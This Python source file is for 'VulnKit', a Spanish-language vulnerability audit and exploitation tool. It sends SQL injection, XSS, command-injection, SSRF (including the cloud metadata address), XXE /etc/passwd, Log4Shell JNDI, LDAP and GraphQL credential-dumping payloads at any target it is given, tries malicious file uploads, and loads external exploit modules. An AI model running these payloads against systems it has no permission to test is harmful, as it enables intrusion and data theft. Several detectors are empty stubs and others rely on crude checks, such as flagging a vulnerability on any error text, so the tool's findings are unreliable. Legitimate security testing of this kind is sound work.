import argparse
import importlib
import os
import dns.resolver
import dns.zone
import dns.query
import requests
import nmap
import ssl
import socket
from bs4 import BeautifulSoup
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = r"""
   Herramienta de auditoría de vulnerabilidades y explotación
    ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗██╗  ██╗██╗████████╗
    ██║   ██║██║   ██║██║     ████╗  ██║██║ ██╔╝██║╚══██╔══╝
    ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╔╝ ██║   ██║
    ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔═██╗ ██║   ██║
     ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║  ██╗██║   ██║
      ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝   ╚═╝  
         version 1.0 - Creado wiht <3 by @Zuk4r1
"""

def list_exploits():
    return [
        "dt", "sqli", "rce", "ssrf", "xss", "deserialization", "ldap_injection",
        "csrf", "x_frame", "https", "file_upload", "graphql_injection",
        "xml_external_entity_injection", "command_injection", "open_redirect", "xxe"
    ]

def port_scan(target):
    print(f"[INFO] Escaneando puertos en {target}...")
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-p- -sV -sC -T4')
    open_ports = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            lport = nm[host][proto].keys()
            for port in lport:
                open_ports.append((port, nm[host][proto][port]['name']))
    return open_ports

def check_ssl_vulnerabilities(target):
    print(f"[INFO] Verificando vulnerabilidades SSL/TLS en {target}...")
    vulnerabilities = []
    context = ssl.create_default_context()
    max_retries = 3
    for attempt in range(max_retries):
        try:
            with socket.create_connection((target, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=target) as secure_sock:
                    cert = secure_sock.getpeercert()
                    if context.protocol == ssl.PROTOCOL_TLSv1:
                        vulnerabilities.append({"name": "TLS 1.0 habilitado", "severity": "Medium"})
                    if not cert.get('subjectAltName'):
                        vulnerabilities.append({"name": "Falta SAN en certificado", "severity": "Low"})
            return vulnerabilities
        except (socket.error, ssl.SSLError) as e:
            print(f"[ERROR] Error al verificar SSL/TLS (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def scan_file_uploads(target):
    print(f"[INFO] Escaneando cargas de archivos en {target}...")
    vulnerabilities = []
    try:
        response = requests.get(f"http://{target}/upload", timeout=10)
        if 'upload' in response.text.lower():
            malicious_files = [
                'malicious.jpg.php', 'malicious.php', 'malicious.exe', 'malicious.pdf',
                'malicious.zip', 'malicious.gif', 'malicious.jsp', 'malicious.svg',
                'malicious.txt', 'malicious.php3', 'malicious.phtml', 'malicious.py'
            ]
            for file in malicious_files:
                if os.path.exists(file):
                    print(f"[INFO] Intentando cargar archivo: {file}")
                    with open(file, 'rb') as f:
                        files = {'file': f}
                        upload_response = requests.post(f"http://{target}/upload", files=files, timeout=10)
                        if upload_response.status_code == 200 and 'success' in upload_response.text.lower():
                            vulnerabilities.append({"name": "File Upload Vulnerability", "details": f"Posible carga insegura detectada con {file}"})
                else:
                    print(f"[WARNING] Archivo no encontrado: {file}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al escanear cargas de archivos: {e}")
    return vulnerabilities

def scan_graphql_injection(target):
    print(f"[INFO] Escaneando inyecciones en GraphQL en {target}...")
    vulnerabilities = []
    malicious_queries = [
        "{ __schema { types { name } } }",
        "mutation { deleteUser(id: 1) }",
        "{ users { id name email password sensitiveData } }",
        "{ posts { title content author { id name } } }",
        "{ __type(name: \"User\") { fields { name type { name } } } }",
        "{ login(username: \"admin\", password: \"password\") { token } }",
        "{ user(id: \"1\") { password roles permissions lastLogin } }",
        "{ allUsers { id name email role password lastLogin createdAt updatedAt } }"
    ]
    try:
        for query in malicious_queries:
            response = requests.post(f"http://{target}/graphql", json={"query": query}, timeout=10)
            if response.status_code == 200 and 'errors' not in response.json():
                vulnerabilities.append({"name": "GraphQL Injection Vulnerability", "details": f"Consulta maliciosa permitida: {query}"})
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al escanear inyecciones GraphQL: {e}")
    return vulnerabilities

def run_exploit(exploit_name, target):
    try:
        print(f"[INFO] Cargando exploit: {exploit_name}")
        module = importlib.import_module(f"exploits.exploit_{exploit_name}")
        return module.execute(target)
    except ModuleNotFoundError:
        return {"name": f"[ERROR] Exploit '{exploit_name}' no encontrado.", "details": ""}
    except Exception as e:
        return {"name": "[ERROR]", "details": f"Error al ejecutar el exploit: {e}"}

def scan_target(target, args):
    results = []
    with ThreadPoolExecutor() as executor:
        futures = []
        if args.scan_generic:
            print("[INFO] Realizando escaneo genérico de vulnerabilidades...")
            futures.append(executor.submit(generic_vulnerability_scan, target))
        if args.scan_headers:
            print("[INFO] Escaneando encabezados de seguridad...")
            futures.append(executor.submit(check_security_headers, target))
        if args.scan_file_upload:
            futures.append(executor.submit(scan_file_uploads, target))
        if args.scan_graphql_injection:
            futures.append(executor.submit(scan_graphql_injection, target))
        if args.port_scan:
            futures.append(executor.submit(port_scan, target))
        if args.ssl_check:
            futures.append(executor.submit(check_ssl_vulnerabilities, target))
        if args.scan_all or args.exploit:
            exploits_to_run = [args.exploit] if args.exploit else list_exploits()
            for exploit in exploits_to_run:
                futures.append(executor.submit(run_exploit, exploit, target))
        
        for future in as_completed(futures):
            result = future.result()
            if isinstance(result, list):
                results.extend(result)
            elif isinstance(result, dict):
                results.append(result)
    return results

def check_security_headers(target):
    print(f"[INFO] Verificando encabezados de seguridad en {target}...")
    headers_to_check = [
        'Content-Security-Policy', 'Permissions-Policy', 'Referrer-Policy',
        'X-Content-Type-Options', 'X-Frame-Options', 'Strict-Transport-Security',
        'X-XSS-Protection', 'Feature-Policy', 'Access-Control-Allow-Origin',
        'Public-Key-Pins', 'Content-Type', 'Expect-CT',
        'Cross-Origin-Embedder-Policy', 'Cross-Origin-Opener-Policy',
        'Access-Control-Allow-Credentials', 'Access-Control-Allow-Headers'
    ]
    recommendations = []
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"http://{target}", timeout=10, verify=False)
            for header in headers_to_check:
                if header not in response.headers:
                    recommendations.append({
                        "name": f"[WARNING] Encabezado ausente: {header}",
                        "details": f"El encabezado {header} debería estar presente para mejorar la seguridad."
                    })
            return recommendations
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al verificar encabezados de seguridad (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return recommendations

def check_insecure_deserialization(target):
    print(f"[INFO] Verificando deserialización insegura en {target}...")
    test_payloads = [
        {"lang": "PHP", "payload": b"serialized_object"},
        {"lang": "Java", "payload": b"java:some_serialized_object"},
        {"lang": ".NET", "payload": b"binary_formatter_object"},
        {"lang": "Python", "payload": b"__import__('os').system('ls')"},
        {"lang": "Ruby", "payload": b"Marshal.load('...')"},
        {"lang": "NodeJS", "payload": b"require('child_process').exec('ls')"},
        {"lang": "Go", "payload": b"encoding/gob"},
        {"lang": "C#", "payload": b"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"},
        {"lang": "Swift", "payload": b"NSKeyedUnarchiver.unarchiveObject(with:)"},
    ]
    vulnerabilities = []
    for test in test_payloads:
        response = send_payload(target, test["payload"])
        if response and is_vulnerable(response):
            vulnerabilities.append({
                "name": f"Deserialización insegura ({test['lang']})",
                "details": f"Vulnerabilidad detectada con payload: {test['payload']}"
            })
    return vulnerabilities

def send_payload(target, payload):
    try:
        response = requests.post(f"http://{target}/api/test", data=payload, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al enviar el payload: {e}")
        return None

def is_vulnerable(response):
    return 'error' in response.lower()

def check_dns_zone_transfer(target):
    print(f"[INFO] Verificando transferencia de zona DNS en {target}...")
    results = []
    try:
        ns_query = dns.resolver.resolve(target, 'NS')
        for ns in ns_query:
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(str(ns), target))
                records = zone.nodes.keys()
                dns_records = [str(record) for record in records]
                results.append({
                    "name": "Transferencia de zona DNS exitosa",
                    "details": f"Registros obtenidos: {dns_records}"
                })
            except Exception as e:
                print(f"[ERROR] No se pudo realizar la transferencia de zona en {ns}: {e}")
                results.append({
                    "name": "[ERROR]",
                    "details": f"No se pudo realizar la transferencia de zona en {ns}."
                })
    except Exception as e:
        print(f"[ERROR] Error al resolver NS: {e}")
        results.append({
            "name": "[ERROR]",
            "details": "No se pudo realizar la transferencia de zona DNS."
        })
    return results

def spider(target):
    print(f"[INFO] Explorando enlaces en {target}...")
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"http://{target}", timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                links = set()
                for link in soup.find_all('a', href=True):
                    links.add(link['href'])
                forms = soup.find_all('form')
                form_details = []
                for form in forms:
                    action = form.get('action')
                    method = form.get('method', 'GET').upper()
                    inputs = form.find_all('input')
                    input_details = [{'type': input.get('type'), 'name': input.get('name')} for input in inputs]
                    form_details.append({
                        'action': action,
                        'method': method,
                        'inputs': input_details
                    })
                results = {
                    'links': list(links),
                    'forms': form_details,
                    'title': soup.title.string if soup.title else ''
                }
                print("[INFO] Enlaces encontrados:")
                for link in results['links']:
                    print(f" - {link}")
                print("[INFO] Formularios encontrados:")
                for form in results['forms']:
                    print(f" - Acción: {form['action']}, Método: {form['method']}, Inputs: {[input['name'] for input in form['inputs']]}")
                return results
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al explorar el sitio web (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return None

def detect_log4shell(target):
    print(f"[INFO] Detectando Log4Shell en {target}...")
    vulnerabilities = []
    payload = "${jndi:ldap://example.com/a}"
    headers = {"User-Agent": payload}
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"http://{target}", headers=headers, timeout=10)
            if response.status_code == 200:
                vulnerabilities.append({"name": "Log4Shell (CVE-2021-44228)", "details": "Posible vulnerabilidad detectada."})
            return vulnerabilities
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al detectar Log4Shell (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def detect_proxylogon(target):
    print(f"[INFO] Detectando ProxyLogon en {target}...")
    vulnerabilities = []
    # Implementar lógica de detección de ProxyLogon
    return vulnerabilities

def detect_printnightmare(target):
    print(f"[INFO] Detectando PrintNightmare en {target}...")
    vulnerabilities = []
    # Implementar lógica de detección de PrintNightmare
    return vulnerabilities

def detect_solarwinds(target):
    print(f"[INFO] Detectando SolarWinds en {target}...")
    vulnerabilities = []
    # Implementar lógica de detección de SolarWinds
    return vulnerabilities

def detect_zerologon(target):
    print(f"[INFO] Detectando Zerologon en {target}...")
    vulnerabilities = []
    # Implementar lógica de detección de Zerologon
    return vulnerabilities

def detect_sqli(target):
    print(f"[INFO] Detectando SQL Injection en {target}...")
    vulnerabilities = []
    payloads = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #", "' OR 1=1 --",
        "' OR 1=1#", "' OR 1=1/*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*"
    ]
    max_retries = 3
    for payload in payloads:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://{target}/?id={payload}", timeout=10)
                if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
                    vulnerabilities.append({"name": "SQL Injection", "details": f"Posible vulnerabilidad detectada con payload: {payload}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar SQL Injection (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_xss(target):
    print(f"[INFO] Detectando XSS en {target}...")
    vulnerabilities = []
    payloads = [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>", "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>"
    ]
    max_retries = 3
    for payload in payloads:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://{target}/?q={payload}", timeout=10)
                if payload in response.text:
                    vulnerabilities.append({"name": "Cross-Site Scripting (XSS)", "details": f"Posible vulnerabilidad detectada con payload: {payload}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar XSS (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_rce(target):
    print(f"[INFO] Detectando RCE en {target}...")
    vulnerabilities = []
    payloads = ["; id", "| id", "`id`", "$(id)", "$(whoami)", "&& id", "&& whoami"]
    max_retries = 3
    for payload in payloads:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://{target}/?cmd={payload}", timeout=10)
                if "uid=" in response.text or "gid=" in response.text:
                    vulnerabilities.append({"name": "Remote Code Execution (RCE)", "details": f"Posible vulnerabilidad detectada con payload: {payload}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar RCE (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_ssrf(target):
    print(f"[INFO] Detectando SSRF en {target}...")
    vulnerabilities = []
    payloads = [
        "http://localhost:80", "http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/",
        "http://[::1]:80", "http://0.0.0.0:80", "http://10.0.0.1:80"
    ]
    max_retries = 3
    for payload in payloads:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://{target}/?url={payload}", timeout=10)
                if "EC2" in response.text or "metadata" in response.text:
                    vulnerabilities.append({"name": "Server-Side Request Forgery (SSRF)", "details": f"Posible vulnerabilidad detectada con payload: {payload}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar SSRF (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_deserialization(target):
    print(f"[INFO] Detectando deserialización insegura en {target}...")
    vulnerabilities = []
    payloads = [
        {"lang": "PHP", "payload": b"O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"},
        {"lang": "Java", "payload": b"rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAEdGVzdHQABHRlc3Q="},
        {"lang": ".NET", "payload": b"AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LAAgAAAAJgAAAFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q="},
        {"lang": "Python", "payload": b"gASVSwAAAAAAAAB9lIwEdGVzdJSMBHRlc3SUjAZfX2J1aWx0aW5fXw=="}
    ]
    max_retries = 3
    for test in payloads:
        for attempt in range(max_retries):
            try:
                response = send_payload(target, test["payload"])
                if response and is_vulnerable(response):
                    vulnerabilities.append({
                        "name": f"Deserialización insegura ({test['lang']})",
                        "details": f"Vulnerabilidad detectada con payload: {test['payload']}"
                    })
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al enviar el payload (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_ldap_injection(target):
    print(f"[INFO] Detectando LDAP Injection en {target}...")
    vulnerabilities = []
    payloads = ["*)(uid=*))(|(uid=*", "*)(&(objectclass=*))", "*(|(objectclass=*))"]
    max_retries = 3
    for payload in payloads:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://{target}/?search={payload}", timeout=10)
                if "ldap" in response.text.lower():
                    vulnerabilities.append({"name": "LDAP Injection", "details": f"Posible vulnerabilidad detectada con payload: {payload}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar LDAP Injection (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_csrf(target):
    print(f"[INFO] Detectando CSRF en {target}...")
    vulnerabilities = []
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"http://{target}/form", timeout=10)
            if "csrf" not in response.text.lower():
                vulnerabilities.append({"name": "Cross-Site Request Forgery (CSRF)", "details": "Posible vulnerabilidad detectada: falta de token CSRF."})
            return vulnerabilities
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al detectar CSRF (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def detect_x_frame(target):
    print(f"[INFO] Detectando X-Frame-Options en {target}...")
    vulnerabilities = []
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"http://{target}", timeout=10)
            if "x-frame-options" not in response.headers:
                vulnerabilities.append({"name": "X-Frame-Options", "details": "Posible vulnerabilidad detectada: falta de encabezado X-Frame-Options."})
            return vulnerabilities
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al detectar X-Frame-Options (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def detect_https(target):
    print(f"[INFO] Detectando HTTPS en {target}...")
    vulnerabilities = []
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"http://{target}", timeout=10)
            if response.url.startswith("http://"):
                vulnerabilities.append({"name": "HTTPS", "details": "Posible vulnerabilidad detectada: el sitio no usa HTTPS."})
            return vulnerabilities
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al detectar HTTPS (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def detect_file_upload(target):
    print(f"[INFO] Detectando File Upload en {target}...")
    vulnerabilities = []
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.get(f"http://{target}/upload", timeout=10)
            if 'upload' in response.text.lower():
                malicious_files = [
                    'malicious.jpg.php', 'malicious.php', 'malicious.exe', 'malicious.pdf',
                    'malicious.zip', 'malicious.gif', 'malicious.jsp', 'malicious.svg',
                    'malicious.txt', 'malicious.php3', 'malicious.phtml', 'malicious.py'
                ]
                for file in malicious_files:
                    if os.path.exists(file):
                        print(f"[INFO] Intentando cargar archivo: {file}")
                        with open(file, 'rb') as f:
                            files = {'file': f}
                            upload_response = requests.post(f"http://{target}/upload", files=files, timeout=10)
                            if upload_response.status_code == 200 and 'success' in upload_response.text.lower():
                                vulnerabilities.append({"name": "File Upload Vulnerability", "details": f"Posible carga insegura detectada con {file}"})
                    else:
                        print(f"[WARNING] Archivo no encontrado: {file}")
            return vulnerabilities
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al detectar File Upload (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def detect_graphql_injection(target):
    print(f"[INFO] Detectando GraphQL Injection en {target}...")
    vulnerabilities = []
    malicious_queries = [
        "{ __schema { types { name } } }",
        "mutation { deleteUser(id: 1) }",
        "{ users { id name email password sensitiveData } }",
        "{ posts { title content author { id name } } }",
        "{ __type(name: \"User\") { fields { name type { name } } } }",
        "{ login(username: \"admin\", password: \"password\") { token } }",
        "{ user(id: \"1\") { password roles permissions lastLogin } }",
        "{ allUsers { id name email role password lastLogin createdAt updatedAt } }"
    ]
    max_retries = 3
    for query in malicious_queries:
        for attempt in range(max_retries):
            try:
                response = requests.post(f"http://{target}/graphql", json={"query": query}, timeout=10)
                if response.status_code == 200 and 'errors' not in response.json():
                    vulnerabilities.append({"name": "GraphQL Injection Vulnerability", "details": f"Consulta maliciosa permitida: {query}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar GraphQL Injection (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_xxe(target):
    print(f"[INFO] Detectando XXE en {target}...")
    vulnerabilities = []
    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>"""
    headers = {"Content-Type": "application/xml"}
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.post(f"http://{target}/xml", data=payload, headers=headers, timeout=10)
            if "root:" in response.text:
                vulnerabilities.append({"name": "XML External Entity (XXE)", "details": "Posible vulnerabilidad detectada: acceso a archivos locales."})
            return vulnerabilities
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Error al detectar XXE (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def detect_command_injection(target):
    print(f"[INFO] Detectando Command Injection en {target}...")
    vulnerabilities = []
    payloads = ["; ls", "| ls", "`ls`", "$(ls)", "&& ls"]
    max_retries = 3
    for payload in payloads:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://{target}/?cmd={payload}", timeout=10)
                if "index.html" in response.text:
                    vulnerabilities.append({"name": "Command Injection", "details": f"Posible vulnerabilidad detectada con payload: {payload}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar Command Injection (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def detect_open_redirect(target):
    print(f"[INFO] Detectando Open Redirect en {target}...")
    vulnerabilities = []
    payloads = ["http://evil.com", "//evil.com", "/\\evil.com"]
    max_retries = 3
    for payload in payloads:
        for attempt in range(max_retries):
            try:
                response = requests.get(f"http://{target}/redirect?url={payload}", timeout=10)
                if response.status_code == 302 and "evil.com" in response.headers.get("Location", ""):
                    vulnerabilities.append({"name": "Open Redirect", "details": f"Posible vulnerabilidad detectada con payload: {payload}"})
                break
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Error al detectar Open Redirect (intento {attempt + 1} de {max_retries}): {e}")
                if attempt == max_retries - 1:
                    return vulnerabilities
    return vulnerabilities

def generic_vulnerability_scan(target):
    print(f"[INFO] Realizando escaneo genérico de vulnerabilidades en {target}...")
    vulnerabilities = []
    vulnerabilities.extend(detect_log4shell(target))
    vulnerabilities.extend(detect_proxylogon(target))
    vulnerabilities.extend(detect_printnightmare(target))
    vulnerabilities.extend(detect_solarwinds(target))
    vulnerabilities.extend(detect_zerologon(target))
    vulnerabilities.extend(detect_sqli(target))
    vulnerabilities.extend(detect_xss(target))
    vulnerabilities.extend(detect_rce(target))
    vulnerabilities.extend(detect_ssrf(target))
    vulnerabilities.extend(detect_deserialization(target))
    vulnerabilities.extend(detect_ldap_injection(target))
    vulnerabilities.extend(detect_csrf(target))
    vulnerabilities.extend(detect_x_frame(target))
    vulnerabilities.extend(detect_https(target))
    vulnerabilities.extend(detect_file_upload(target))
    vulnerabilities.extend(detect_graphql_injection(target))
    vulnerabilities.extend(detect_xxe(target))
    vulnerabilities.extend(detect_command_injection(target))
    vulnerabilities.extend(detect_open_redirect(target))
    return vulnerabilities

def save_results_to_file(results, output_file):
    with open(output_file, 'w') as f:
        f.write("Resultados del escaneo:\n\n")
        for result in results:
            if isinstance(result, dict) and 'name' in result and 'details' in result:
                f.write(f"- {result['name']}: {result['details']}\n")
            else:
                f.write(f"- Resultado inesperado: {result}\n")

def main():
    print(Fore.YELLOW + BANNER)
    parser = argparse.ArgumentParser(description="Herramienta de auditoría de vulnerabilidades y explotación.")
    parser.add_argument("target", help="Dominio o IP del objetivo a analizar")
    parser.add_argument("--exploit", help="Nombre del exploit a ejecutar", choices=list_exploits())
    parser.add_argument("--scan-headers", action="store_true", help="Escanea encabezados de seguridad")
    parser.add_argument("--scan-all", action="store_true", help="Ejecuta todos los exploits disponibles")
    parser.add_argument("--scan-generic", action="store_true", help="Escanea vulnerabilidades genéricas no cubiertas por exploits")
    parser.add_argument("--scan-file-upload", action="store_true", help="Escanea vulnerabilidades de carga de archivos")
    parser.add_argument("--scan-graphql-injection", action="store_true", help="Escanea inyecciones en GraphQL")
    parser.add_argument("--check-deserialization", action="store_true", help="Verifica deserialización insegura")
    parser.add_argument("--check-dns-transfer", action="store_true", help="Verifica transferencia de zona DNS")
    parser.add_argument("--spider", action="store_true", help="Explora enlaces del sitio web")
    parser.add_argument("--port-scan", action="store_true", help="Escanea puertos abiertos")
    parser.add_argument("--ssl-check", action="store_true", help="Verifica vulnerabilidades SSL/TLS")  # Agregar esta línea
    args = parser.parse_args()

    # Ejecutar los escaneos según los argumentos proporcionados
    results = scan_target(args.target, args)
    if args.check_deserialization:
        results.extend(check_insecure_deserialization(args.target))
    if args.check_dns_transfer:
        results.extend(check_dns_zone_transfer(args.target))
    if args.spider:
        spider(args.target)

    # Guardar los resultados
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_file = f"Report_{timestamp}.txt"
    if results:
        print("\n[INFO] Resultados encontrados:")
        for result in results:
            if isinstance(result, dict) and 'name' in result and 'details' in result:
                print(f" - {result['name']}: {result['details']}")
            else:
                print(f"[ERROR] Resultado inesperado: {result}")
        save_results_to_file(results, output_file)
        print(f"[INFO] Resultados guardados en {output_file}")
    else:
        print("\n[INFO] No se detectaron vulnerabilidades.")

if __name__ == "__main__":
    main()
